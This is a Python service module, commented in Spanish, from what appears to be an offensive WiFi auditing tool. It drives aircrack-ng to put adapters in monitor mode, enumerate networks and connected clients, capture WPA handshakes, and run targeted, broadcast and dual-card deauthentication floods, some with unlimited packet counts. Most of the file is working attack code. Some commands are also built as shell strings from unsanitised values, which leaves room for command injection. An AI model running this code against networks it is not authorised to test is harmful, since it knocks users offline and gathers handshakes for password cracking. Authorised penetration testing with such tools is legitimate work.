"""
dragonfly/services/wifi_service.py - Servicio central de auditoría inalámbrica (WiFi).
Implementa modo monitor, parseo de Airodump, captura de handshakes y ataques Deauth individuales y dobles.
"""

import os
import time
import random
import subprocess
import threading
from datetime import datetime
from dragonfly.config import BASE_DIR_WIFI, BASE_DIR_CLIENTS
from dragonfly.core.executor import CommandExecutor
from dragonfly.core.process_manager import ProcessManager
from dragonfly.core.session import SessionManager


class MultiDeauthAttack:
    """
    Gestión de dos procesos aireplay-ng en paralelo para desautenticación dual-band / doble tarjeta.
    """
    def __init__(self, mon_ifaces, bssids, channels, burst, callback=None):
        self.mon_ifaces = mon_ifaces
        self.bssids = bssids
        self.channels = channels
        self.burst = burst
        self.callback = callback or (lambda msg: None)
        self.procs = []
        self.threads = []
        self._stop_flag = False

    def start(self):
        self._stop_flag = False
        for i in range(min(2, len(self.mon_ifaces))):
            cmd = [
                "sudo", "aireplay-ng",
                "--deauth", str(self.burst),
                "-a", self.bssids[i],
                self.mon_ifaces[i]
            ]
            self.callback(f"[*] Iniciando: {' '.join(cmd)}")
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            self.procs.append(proc)
            t = threading.Thread(target=self._reader, args=(proc, i), daemon=True)
            t.start()
            self.threads.append(t)

    def _reader(self, proc, idx):
        try:
            for line in iter(proc.stdout.readline, ''):
                if self._stop_flag:
                    break
                if line:
                    self.callback(f"[if{idx+1}] {line.rstrip()}")
        except Exception as e:
            self.callback(f"[!] Error en lector {idx+1}: {e}")
        finally:
            proc.stdout.close()

    def stop(self):
        self._stop_flag = True
        for proc in self.procs:
            try:
                proc.terminate()
            except Exception:
                pass
        for proc in self.procs:
            try:
                proc.wait(timeout=3)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        self.procs.clear()
        self.threads.clear()


class WiFiService:
    """
    Servicio integral de auditoría inalámbrica ofensiva con Aircrack-ng suite.
    """

    def __init__(self, executor: CommandExecutor = None, process_manager: ProcessManager = None):
        self.executor = executor or CommandExecutor()
        self.pm = process_manager or ProcessManager()
        self.active_mon_iface = None
        self._deauth_proc = None
        self.multi_deauth_instance = None

    def enable_monitor_mode(self, iface: str) -> str:
        """
        Pone una interfaz en modo monitor usando airmon-ng eliminando procesos conflictivos.
        Retorna el nombre de la interfaz en modo monitor resultante (ej. 'wlan0mon' o 'wlan0').
        """
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "airmon-ng", "start", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        mon = f"{iface}mon" if os.path.exists(f"/sys/class/net/{iface}mon") else iface
        self.active_mon_iface = mon
        return mon

    def disable_monitor_mode(self, mon_iface: str):
        """
        Detiene el modo monitor y restablece el gestor de red.
        """
        if mon_iface:
            try:
                subprocess.run(["sudo", "airmon-ng", "stop", mon_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            except Exception:
                pass

            # Si el adaptador no cambió de nombre (ej. wlan1 en vez de wlan1mon),
            # asegurar que la interfaz física retorne a modo managed
            base_iface = mon_iface.replace("mon", "")
            try:
                subprocess.run(["sudo", "ip", "link", "set", base_iface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
                subprocess.run(["sudo", "iw", "dev", base_iface, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
                subprocess.run(["sudo", "ip", "link", "set", base_iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
            except Exception:
                pass

        self.pm.restart_network_manager(timeout=15)
        self.active_mon_iface = None

    def scan_networks(self, mon_iface: str, duration: int = 15):
        """
        Escanea redes inalámbricas usando airodump-ng durante el tiempo indicado.
        Retorna una lista de diccionarios con formato:
        [{'bssid': ..., 'ch': ..., 'essid': ...}, ...]
        """
        scan_prefix = f"/tmp/scan_wifi_{int(time.time())}_{random.randint(1000, 9999)}"
        cmd = f"sudo timeout -k 5 {duration}s airodump-ng {mon_iface} -w {scan_prefix} --output-format csv"

        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        redes = []
        csv_file = f"{scan_prefix}-01.csv"
        try:
            if os.path.exists(csv_file):
                with open(csv_file, "r", errors="ignore") as f:
                    partes = f.read().split("Station MAC,")
                    for linea in partes[0].split("\n")[2:]:
                        r = linea.split(",")
                        if len(r) >= 14 and ":" in r[0]:
                            bssid = r[0].strip()
                            channel = r[3].strip()
                            essid = r[13].strip() if r[13].strip() else "<Oculta>"
                            try:
                                ch_int = int(channel)
                                banda = '2.4GHz' if ch_int <= 14 else '5GHz'
                            except Exception:
                                banda = '2.4GHz'
                            redes.append({"bssid": bssid, "ch": channel, "essid": essid, "banda": banda})
        except Exception:
            pass
        finally:
            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                try:
                    os.remove(f"{scan_prefix}{ext}")
                except Exception:
                    pass

        return redes

    def scan_clients(self, mon_iface: str, bssid: str, channel: str, duration: int = 10):
        """
        Captura clientes conectados a un punto de acceso específico.
        Retorna una lista de direcciones MAC de clientes encontrados.
        """
        scan_prefix = f"/tmp/scan_clients_{int(time.time())}_{random.randint(1000, 9999)}"
        cmd = f"sudo timeout -k 5 {duration}s airodump-ng --bssid {bssid} -c {channel} {mon_iface} -w {scan_prefix} --output-format csv"

        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        clientes = []
        csv_file = f"{scan_prefix}-01.csv"
        try:
            if os.path.exists(csv_file):
                with open(csv_file, "r", errors="ignore") as f:
                    partes = f.read().split("Station MAC,")
                    if len(partes) > 1:
                        for linea in partes[1].split("\n")[1:]:
                            c = linea.split(",")
                            if len(c) >= 6 and ":" in c[0]:
                                clientes.append(c[0].strip())
        except Exception:
            pass
        finally:
            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                try:
                    os.remove(f"{scan_prefix}{ext}")
                except Exception:
                    pass

        return clientes

    def start_handshake_capture(self, mon_iface: str, target_red: dict, cliente_mac: str = "FF:FF:FF:FF:FF:FF",
                                on_output=None, on_finish=None):
        """
        Lanza airodump-ng para capturar paquetes en segundo plano y dispara una ráfaga deauth para forzar handshake.
        """
        session_dir = SessionManager.create_session(BASE_DIR_WIFI)
        ch = target_red['ch']
        bssid = target_red['bssid']

        if on_output:
            on_output(f"[*] Iniciando captura airodump en {session_dir}...")

        # Iniciar airodump-ng
        proc_airodump = subprocess.Popen(
            ["sudo", "airodump-ng", "--channel", str(ch), "--bssid", bssid, "-w", f"{session_dir}/Captura", mon_iface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        self.pm.register("airodump_handshake", proc_airodump)

        time.sleep(2)

        # Iniciar ráfaga deauth con aireplay-ng
        if cliente_mac and cliente_mac.upper() != "FF:FF:FF:FF:FF:FF":
            cmd_deauth = f"sudo aireplay-ng -0 10 -a {bssid} -c {cliente_mac} {mon_iface}"
            if on_output:
                on_output(f"[*] Inyectando deauth a {cliente_mac}...")
        else:
            cmd_deauth = f"sudo aireplay-ng -0 10 -a {bssid} {mon_iface}"
            if on_output:
                on_output("[*] Inyectando deauth en modo broadcast...")

        def on_after_deauth(rc):
            if on_output:
                on_output(f"[+] Archivo CAP guardado en: {session_dir}")
                on_output("[*] Puede finalizar la auditoria")
            if on_finish:
                on_finish(session_dir)

        self.executor.run_async(cmd_deauth, on_output=on_output, on_finish=on_after_deauth)
        return session_dir

    def stop_handshake_capture(self):
        """
        Detiene los procesos de captura airodump y ataque deauth de handshake de forma inmediata.
        """
        try:
            self.executor.stop_current()
        except Exception:
            pass

        self.pm.terminate_proc("airodump_handshake", timeout=1)
        self.pm.pkill("airodump-ng")
        self.pm.pkill_force("airodump-ng")
        self.pm.pkill("aireplay-ng")
        self.pm.pkill_force("aireplay-ng")

    def stop_handshake_audit(self, mon_iface: str = None):
        """
        Finaliza la captura de handshake y restaura la red usando el flujo estándar del sistema.
        """
        self.stop_handshake_capture()
        self.restore_wifi_system(mon_iface or self.active_mon_iface)

    def start_deauth_attack(self, mon_iface: str, target_red: dict, cliente_mac: str = None,
                            count: str = "0", on_output=None, on_finish=None):
        """
        Lanza un ataque de desautenticación dirigido o broadcast.
        """
        # Fijar canal
        subprocess.run(["sudo", "iw", "dev", mon_iface, "set", "channel", str(target_red['ch'])],
                       stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

        cmd = ["sudo", "aireplay-ng", "--deauth", str(count), "-a", target_red['bssid']]
        if cliente_mac and cliente_mac.upper() != "FF:FF:FF:FF:FF:FF":
            cmd.extend(["-c", cliente_mac])
        cmd.append(mon_iface)

        if on_output:
            on_output(f"[*] Ejecutando: {' '.join(cmd)}")

        self._deauth_proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        self.pm.register("deauth_active", self._deauth_proc)

        def reader():
            try:
                for line in iter(self._deauth_proc.stdout.readline, ''):
                    if line and on_output:
                        on_output(line.rstrip())
                self._deauth_proc.stdout.close()
                rc = self._deauth_proc.wait()
                if on_finish:
                    on_finish(rc)
            except Exception:
                pass

        threading.Thread(target=reader, daemon=True).start()

    def stop_deauth_attack(self):
        """Detiene el ataque deauth en curso."""
        self.pm.terminate_proc("deauth_active")
        self.pm.pkill("aireplay-ng")

    def scan_networks_dual(self, mon1: str, mon2: str, duration: int = 20):
        """
        Escanea el espectro con dos interfaces simultáneamente (útil para 2.4GHz + 5GHz).
        Retorna (redes_unicas, iface_map).
        """
        prefix1 = f"/tmp/dual_scan1_{int(time.time())}_{random.randint(1000, 9999)}"
        prefix2 = f"/tmp/dual_scan2_{int(time.time())}_{random.randint(1000, 9999)}"

        cmd1 = f"sudo timeout -k 5 {duration}s airodump-ng {mon1} -w {prefix1} --output-format csv"
        cmd2 = f"sudo timeout -k 5 {duration}s airodump-ng {mon2} -w {prefix2} --output-format csv"

        p1 = subprocess.Popen(cmd1, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p2 = subprocess.Popen(cmd2, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p1.wait()
        p2.wait()

        redes = []
        iface_map = {}

        def parsear(prefix, mon_iface):
            csv_file = f"{prefix}-01.csv"
            try:
                if os.path.exists(csv_file):
                    with open(csv_file, "r", errors="ignore") as f:
                        partes = f.read().split("Station MAC,")
                        for linea in partes[0].split("\n")[2:]:
                            r = linea.split(",")
                            if len(r) >= 14 and ":" in r[0]:
                                bssid = r[0].strip()
                                ch = r[3].strip()
                                essid = r[13].strip() or "<Oculta>"
                                try:
                                    banda = '2.4GHz' if int(ch) <= 14 else '5GHz'
                                except Exception:
                                    banda = '2.4GHz'
                                redes.append({"bssid": bssid, "ch": ch, "essid": essid, "banda": banda})
                                iface_map[bssid] = mon_iface
            except Exception:
                pass
            finally:
                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                    try:
                        os.remove(f"{prefix}{ext}")
                    except Exception:
                        pass

        parsear(prefix1, mon1)
        parsear(prefix2, mon2)

        redes_unicas = list({v['bssid']: v for v in redes}.values())
        return redes_unicas, iface_map

    def scan_clients_passive(self, mon_iface: str, bssid: str, channel: str, duration: int = 30):
        """
        Recopila clientes asociados a un BSSID de forma pasiva en su canal durante duration segundos.
        """
        prefix = f"/tmp/client_enum_{int(time.time())}_{random.randint(1000, 9999)}"
        subprocess.run(["sudo", "iw", "dev", mon_iface, "set", "channel", str(channel)],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        cmd = f"sudo timeout -k 5 {duration}s airodump-ng --bssid {bssid} -c {channel} {mon_iface} -w {prefix} --output-format csv"
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.pm.register("client_enum", proc)
        proc.wait()

        clientes = []
        csv_file = f"{prefix}-01.csv"
        try:
            if os.path.exists(csv_file):
                with open(csv_file, "r", errors="ignore") as f:
                    partes = f.read().split("Station MAC,")
                    if len(partes) > 1:
                        for linea in partes[1].split("\n")[1:]:
                            c = linea.split(",")
                            if len(c) >= 6 and ":" in c[0]:
                                clientes.append(c[0].strip())
        except Exception:
            pass
        finally:
            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                try:
                    os.remove(f"{prefix}{ext}")
                except Exception:
                    pass

        return clientes

    def scan_clients_dual(self, targets: list, duration: int = 30):
        """
        targets es [(red1, mon1), (red2, mon2)]
        Lanza escaneo de clientes en paralelo en ambas tarjetas.
        Retorna [(red1, clientes1), (red2, clientes2)].
        """
        results = [None, None]
        def worker(idx, red, mon):
            clis = self.scan_clients_passive(mon, red['bssid'], red['ch'], duration=duration)
            results[idx] = (red, clis)

        threads = []
        for i, (red, mon) in enumerate(targets[:2]):
            t = threading.Thread(target=worker, args=(i, red, mon))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

        return [r for r in results if r is not None]

    def stop_client_enum(self):
        """Detiene cualquier proceso airodump-ng de enumeración de clientes."""
        self.pm.terminate_proc("client_enum")
        self.pm.pkill("airodump-ng")

    def save_client_results(self, data, is_dual: bool = False) -> str:
        """
        Guarda los resultados de enumeración en Resultados_Clientes/
        """
        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        prefix = "Clientes_Dual" if is_dual else "Clientes_Single"
        res_dir = os.path.join(BASE_DIR_CLIENTS, f"{prefix}-{timestamp}")
        os.makedirs(res_dir, exist_ok=True)

        if is_dual:
            filepath = os.path.join(res_dir, "clientes_dual.txt")
            with open(filepath, "w") as f:
                for red, macs in data:
                    f.write(f"\n=== {red.get('essid', 'Desconocido')} ({red.get('banda', '')}, CH{red.get('ch', '')}) ===\n")
                    f.write("\n".join(macs) if macs else "Sin clientes detectados\n")
                    f.write("\n")
        else:
            red, clientes = data
            filepath = os.path.join(res_dir, "clientes.txt")
            with open(filepath, "w") as f:
                f.write(f"ESSID: {red.get('essid', '')}\nBSSID: {red.get('bssid', '')}\n\nCLIENTES CONECTADOS:\n")
                f.write("\n".join(clientes) if clientes else "No se detectaron clientes activos.\n")

        return res_dir

    def restore_wifi_system(self, mon_ifaces=None):
        """
        Detiene airodump, desactiva monitores y reinicia NetworkManager.
        """
        try:
            self.executor.stop_current()
        except Exception:
            pass
        self.pm.pkill("airodump-ng")
        self.pm.pkill_force("airodump-ng")
        self.pm.pkill("aireplay-ng")
        self.pm.pkill_force("aireplay-ng")
        if mon_ifaces:
            if isinstance(mon_ifaces, str):
                mon_ifaces = [mon_ifaces]
            for m in mon_ifaces:
                if m:
                    self.disable_monitor_mode(m)
        else:
            self.pm.restart_network_manager(timeout=15)

    def start_dual_deauth(self, mon1: str, mon2: str, red1: dict, red2: dict, burst: str = "0", callback=None):
        """
        Fija canales e inicia desautenticación dual en dos interfaces.
        """
        subprocess.run(["sudo", "iw", "dev", mon1, "set", "channel", str(red1['ch'])],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "iw", "dev", mon2, "set", "channel", str(red2['ch'])],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        self.multi_deauth_instance = MultiDeauthAttack(
            mon_ifaces=[mon1, mon2],
            bssids=[red1['bssid'], red2['bssid']],
            channels=[str(red1['ch']), str(red2['ch'])],
            burst=burst,
            callback=callback
        )
        self.multi_deauth_instance.start()
        return self.multi_deauth_instance

    def stop_dual_deauth(self):
        """Detiene el ataque dual deauth."""
        if self.multi_deauth_instance:
            self.multi_deauth_instance.stop()
            self.multi_deauth_instance = None
        self.pm.pkill("aireplay-ng")

    def list_saved_handshakes(self):
        """Retorna las sesiones de captura de handshake guardadas."""
        return SessionManager.list_sessions(BASE_DIR_WIFI)

    def list_handshake_files(self, session_name: str):
        """Retorna los archivos (.cap, etc.) de una sesión."""
        session_path = os.path.join(BASE_DIR_WIFI, session_name)
        return SessionManager.list_session_files(session_path)
